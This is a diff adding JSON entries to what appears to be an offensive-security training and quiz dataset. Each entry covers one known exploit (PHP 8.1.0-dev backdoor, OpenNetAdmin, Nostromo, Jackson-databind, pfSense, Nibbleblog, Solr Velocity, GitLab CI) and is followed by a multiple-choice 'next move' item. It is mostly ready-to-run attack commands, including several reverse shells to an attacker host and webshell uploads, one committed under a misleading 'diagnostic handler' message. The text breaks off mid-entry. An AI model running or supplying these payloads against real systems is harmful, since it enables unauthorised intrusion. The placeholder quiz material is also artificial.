+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute PHP 8.1.0-dev User-Agentt Backdoor Remote Code Execution, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Send an HTTP GET request with the header 'User-Agentt: zerodium system(\"id\");'.",
+            "demo": [
+              {
+                "run": "curl -s -H \"User-Agentt: zerodium system('id');\" http://{{target}}/",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "PHP 8.1.0-dev backdoor command execution verified."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Start Netcat listener on attacking host.",
+            "demo": [
+              {
+                "run": "curl -s -H \"User-Agentt: zerodium system('bash -c \\\"bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1\\\"');\" http://{{target}}/",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Interactive reverse shell established on target host."
+          }
+        ]
+      },
+      "situation": "Scenario: Verify PHP 8.1.0-dev User-Agentt backdoor command execution. Which move should you run next?",
+      "choices": [
+        "php-backdoor-useragent",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is PHP 8.1.0-dev User-Agentt Backdoor Remote Code Execution.",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is PHP 8.1.0-dev User-Agentt Backdoor Remote Code Execution.",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is PHP 8.1.0-dev User-Agentt Backdoor Remote Code Execution."
+      }
+    },
+    "opennetadmin-rce": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once execute command injection on vulnerable OpenNetAdmin (ONA) v18.1.1 instances. The key confirmation is: Command execution achieved through OpenNetAdmin xajax parameter injection.",
+      "cmd": "curl -s -d \"xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;id;\" \"http://{{target}}/ona/dcm.php\"",
+      "tool": "curl",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Command execution achieved through OpenNetAdmin xajax parameter injection.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute OpenNetAdmin (ONA) v18.1.1 Command Injection RCE, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Send HTTP POST request to /ona/dcm.php with xajax parameters invoking tooltips and injected shell command.",
+            "demo": [
+              {
+                "run": "curl -s -d \"xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;id;\" \"http://{{target}}/ona/dcm.php\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Command execution achieved through OpenNetAdmin xajax parameter injection."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Start Netcat listener on attacker machine.",
+            "demo": [
+              {
+                "run": "curl -s -d \"xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash -c 'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1';\" \"http://{{target}}/ona/dcm.php\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Foothold obtained via OpenNetAdmin exploit."
+          }
+        ]
+      },
+      "situation": "Scenario: Execute command injection on vulnerable OpenNetAdmin (ONA) v18.1.1 instances. Which move should you run next?",
+      "choices": [
+        "opennetadmin-rce",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is OpenNetAdmin (ONA) v18.1.1 Command Injection RCE.",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is OpenNetAdmin (ONA) v18.1.1 Command Injection RCE.",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is OpenNetAdmin (ONA) v18.1.1 Command Injection RCE."
+      }
+    },
+    "nostromo-rce": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once verify directory traversal command execution on Nostromo nhttpd <= 1.9.6. The key confirmation is: Unauthenticated Nostromo remote code execution confirmed.",
+      "cmd": "curl -s -X POST 'http://{{target}}/.%0d%0a/bin/sh' -d 'echo; id'",
+      "tool": "curl",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Unauthenticated Nostromo remote code execution confirmed.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Nostromo Web Server (nhttpd) Remote Code Execution (CVE-2019-16278), confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Send HTTP POST request to /.%0d%0a/bin/sh with echo and command in the POST body.",
+            "demo": [
+              {
+                "run": "curl -s -X POST 'http://{{target}}/.%0d%0a/bin/sh' -d 'echo; id'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Unauthenticated Nostromo remote code execution confirmed."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Start listening on attacker port with nc -lvnp.",
+            "demo": [
+              {
+                "run": "curl -s -X POST 'http://{{target}}/.%0d%0a/bin/sh' -d 'echo; bash -c \"bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1\"'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Reverse shell obtained on host running Nostromo."
+          }
+        ]
+      },
+      "situation": "Scenario: Verify directory traversal command execution on Nostromo nhttpd <= 1.9.6. Which move should you run next?",
+      "choices": [
+        "nostromo-rce",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is Nostromo Web Server (nhttpd) Remote Code Execution (CVE-2019-16278).",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is Nostromo Web Server (nhttpd) Remote Code Execution (CVE-2019-16278).",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is Nostromo Web Server (nhttpd) Remote Code Execution (CVE-2019-16278)."
+      }
+    },
+    "jackson-databind-rce": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once stage malicious H2 SQL payload on local HTTP server. The key confirmation is: H2 database trigger payload staged and accessible over HTTP.",
+      "cmd": "echo 'CREATE ALIAS SHELL EXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\\\\\A\"); return s.hasNext() ? s.next() : \"\"; }$$; CALL SHELL(\"bash -c \\'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1\\'\");' > inject.sql && python3 -m http.server 8000",
+      "tool": "python3",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "H2 database trigger payload staged and accessible over HTTP.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Jackson Databind Polymorphic Deserialization RCE (CVE-2019-12384), confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Create inject.sql with Java CREATE ALIAS executing bash reverse shell.",
+            "demo": [
+              {
+                "run": "echo 'CREATE ALIAS SHELL EXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\\\\\A\"); return s.hasNext() ? s.next() : \"\"; }$$; CALL SHELL(\"bash -c \\'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1\\'\");' > inject.sql && python3 -m http.server 8000",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "H2 database trigger payload staged and accessible over HTTP."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Submit JSON payload with DriverManagerConnectionSource pointing to H2 RUNSCRIPT URL.",
+            "demo": [
+              {
+                "run": "curl -s -X POST 'http://{{target}}/api/json' -H 'Content-Type: application/json' -d '[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \\'http://{{lhost}}:8000/inject.sql\\'\"}]'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Remote code execution obtained via Jackson Databind deserialization."
+          }
+        ]
+      },
+      "situation": "Scenario: Stage malicious H2 SQL payload on local HTTP server. Which move should you run next?",
+      "choices": [
+        "jackson-databind-rce",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is Jackson Databind Polymorphic Deserialization RCE (CVE-2019-12384).",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is Jackson Databind Polymorphic Deserialization RCE (CVE-2019-12384).",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is Jackson Databind Polymorphic Deserialization RCE (CVE-2019-12384)."
+      }
+    },
+    "pfsense-rrd-rce": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once verify command execution on pfSense via status_rrd_graph_img.php. The key confirmation is: Command execution on pfSense confirmed as root.",
+      "cmd": "curl -sk -u '{{user}}:{{password}}' 'https://{{target}}/status_rrd_graph_img.php?database=queues;id;'",
+      "tool": "curl",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Command execution on pfSense confirmed as root.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute pfSense RRD Graph Command Injection RCE (CVE-2014-4688), confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Pass injected shell command in the database query parameter with valid credentials.",
+            "demo": [
+              {
+                "run": "curl -sk -u '{{user}}:{{password}}' 'https://{{target}}/status_rrd_graph_img.php?database=queues;id;'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Command execution on pfSense confirmed as root."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Send reverse shell payload using Netcat or mkfifo in the database parameter.",
+            "demo": [
+              {
+                "run": "curl -sk -u '{{user}}:{{password}}' 'https://{{target}}/status_rrd_graph_img.php?database=queues;rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>&1|nc+{{lhost}}+{{lport}}+>/tmp/f;'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Full root compromise of pfSense appliance."
+          }
+        ]
+      },
+      "situation": "Scenario: Verify command execution on pfSense via status_rrd_graph_img.php. Which move should you run next?",
+      "choices": [
+        "pfsense-rrd-rce",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is pfSense RRD Graph Command Injection RCE (CVE-2014-4688).",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is pfSense RRD Graph Command Injection RCE (CVE-2014-4688).",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is pfSense RRD Graph Command Injection RCE (CVE-2014-4688)."
+      }
+    },
+    "web-config-upload-bypass": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once bypass IIS upload extension filters by uploading a custom web.config configuration file. The key confirmation is: Custom IIS web.config successfully planted in upload directory.",
+      "cmd": "curl -s -F 'file=@web.config' 'http://{{target}}/{{upload_path}}'",
+      "tool": "curl",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Custom IIS web.config successfully planted in upload directory.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute IIS web.config Extension Filter Upload Bypass, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Upload web.config containing an ASP.NET handler mapping or inline script execution.",
+            "demo": [
+              {
+                "run": "curl -s -F 'file=@web.config' 'http://{{target}}/{{upload_path}}'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Custom IIS web.config successfully planted in upload directory."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Request the uploaded web.config file or associated mapped script handler.",
+            "demo": [
+              {
+                "run": "curl -s 'http://{{target}}/UploadedFiles/web.config'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Interactive web shell established on Windows IIS target."
+          }
+        ]
+      },
+      "situation": "Scenario: Bypass IIS upload extension filters by uploading a custom web.config configuration file. Which move should you run next?",
+      "choices": [
+        "web-config-upload-bypass",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is IIS web.config Extension Filter Upload Bypass.",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is IIS web.config Extension Filter Upload Bypass.",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is IIS web.config Extension Filter Upload Bypass."
+      }
+    },
+    "nibbleblog-myimage-upload-rce": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once exploit Nibbleblog 4.0.3 My Image plugin arbitrary file upload vulnerability (CVE-2015-6967). The key confirmation is: PHP webshell planted at content/private/plugins/my_image/image.php.",
+      "cmd": "curl -s -b cookies.txt -F 'image=@shell.php' 'http://{{target}}/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image'",
+      "tool": "curl",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "PHP webshell planted at content/private/plugins/my_image/image.php.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Nibbleblog My_Image Arbitrary Upload RCE (CVE-2015-6967), confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Send authenticated POST request to admin.php?controller=plugins&action=config&plugin=my_image with PHP payload as 'image'.",
+            "demo": [
+              {
+                "run": "curl -s -b cookies.txt -F 'image=@shell.php' 'http://{{target}}/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "PHP webshell planted at content/private/plugins/my_image/image.php."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Send HTTP GET request to /nibbleblog/content/private/plugins/my_image/image.php",
+            "demo": [
+              {
+                "run": "curl -s 'http://{{target}}/nibbleblog/content/private/plugins/my_image/image.php'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Interactive shell obtained as web server user."
+          }
+        ]
+      },
+      "situation": "Scenario: Exploit Nibbleblog 4.0.3 My Image plugin arbitrary file upload vulnerability (CVE-2015-6967). Which move should you run next?",
+      "choices": [
+        "nibbleblog-myimage-upload-rce",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is Nibbleblog My_Image Arbitrary Upload RCE (CVE-2015-6967).",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is Nibbleblog My_Image Arbitrary Upload RCE (CVE-2015-6967).",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is Nibbleblog My_Image Arbitrary Upload RCE (CVE-2015-6967)."
+      }
+    },
+    "solr-velocity-template-rce": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once enable Velocity resource loader via Apache Solr Core config API (CVE-2019-17558). The key confirmation is: Velocity template loader enabled on target Solr core.",
+      "cmd": "curl -X POST -H 'Content-Type: application/json' -d '{\"set-property\":{\"params.resource.loader.enabled\":\"true\"}}' 'http://{{target}}:8983/solr/{{core}}/config'",
+      "tool": "curl",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Velocity template loader enabled on target Solr core.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Apache Solr Velocity Template RCE (CVE-2019-17558), confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Send POST request with JSON setting params.resource.loader.enabled to true.",
+            "demo": [
+              {
+                "run": "curl -X POST -H 'Content-Type: application/json' -d '{\"set-property\":{\"params.resource.loader.enabled\":\"true\"}}' 'http://{{target}}:8983/solr/{{core}}/config'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Velocity template loader enabled on target Solr core."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Send GET request to /solr/<core>/select with custom Velocity template invoking java.lang.Runtime.",
+            "demo": [
+              {
+                "run": "curl -s 'http://{{target}}:8983/solr/{{core}}/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+${rt}'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Remote code execution achieved via Solr Velocity template injection."
+          }
+        ]
+      },
+      "situation": "Scenario: Enable Velocity resource loader via Apache Solr Core config API (CVE-2019-17558). Which move should you run next?",
+      "choices": [
+        "solr-velocity-template-rce",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is Apache Solr Velocity Template RCE (CVE-2019-17558).",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is Apache Solr Velocity Template RCE (CVE-2019-17558).",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is Apache Solr Velocity Template RCE (CVE-2019-17558)."
+      }
+    },
+    "gitlab-ci-webshell": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once commit a PHP webshell into a repository branch tied to automated CI/CD runners or webhooks. The key confirmation is: Webshell committed and pushed to CI/CD pipeline branch.",
+      "cmd": "git checkout -b feature-pipeline && echo '<?php system($_GET[\"c\"]); ?>' > shell.php && git add shell.php && git commit -m 'Deploy diagnostic handler' && git push origin feature-pipeline",
+      "tool": "git",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Webshell committed and pushed to CI/CD pipeline branch.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute GitLab CI/CD Automated Runner Webshell Deployment, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Create branch feature-pipeline, add shell.php, and push to origin.",
+            "demo": [
+              {
+                "run": "git checkout -b feature-pipeline && echo '<?php system($_GET[\"c\"]); ?>' > shell.php && git add shell.php && git commit -m 'Deploy diagnostic handler' && git push origin feature-pipeline",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Webshell committed and pushed to CI/CD pipeline branch."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Request the deployed shell path under the target web root using curl.",
+            "demo": [
+              {
+                "run": "curl -s 'http://{{target}}/{{app_path}}/shell.php?c=id'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
